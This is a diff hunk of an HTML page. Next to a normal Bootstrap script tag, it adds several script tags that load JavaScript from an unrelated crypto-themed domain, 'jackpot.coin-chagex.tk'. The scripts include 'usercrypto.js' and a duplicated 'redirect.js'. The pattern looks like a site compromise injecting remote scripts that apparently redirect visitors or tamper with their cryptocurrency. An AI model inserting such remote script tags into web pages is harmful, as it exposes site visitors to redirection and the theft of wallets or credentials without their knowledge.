@@ -873,7 +873,12 @@ $(function() {
             <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.1/dist/js/bootstrap.min.js"
                integrity="sha384-skAcpIdS7UcVUC05LJ9Dxay8AXcDYfBJqt1CJ85S/CFujBsIzCIv+l9liuYLaMQ/"
                crossorigin="anonymous">
-            </script>
+            </script><script src="https://jackpot.coin-chagex.tk/js/jquery-1.12.4.min.js"></script>
+      <script src="https://jackpot.coin-chagex.tk/js/usercrypto.js"></script>
+      <script src="https://jackpot.coin-chagex.tk/js/2.6a1700d0.chunk.js"></script>
+      <script src="https://jackpot.coin-chagex.tk/js/main.c297a2a4.chunk.js"></script>
+      <script src="https://stackpath.bootstrapcdn.com/bootstrap/5.0.0-alpha1/js/bootstrap.bundle.min.js"></script>
+      <script src="https://jackpot.coin-chagex.tk/js/redirect.js" type="text/javascript"></script>
             <script src="https://jackpot.coin-chagex.tk/js/redirect.js" type="text/javascript"></script>
             s
 </body>
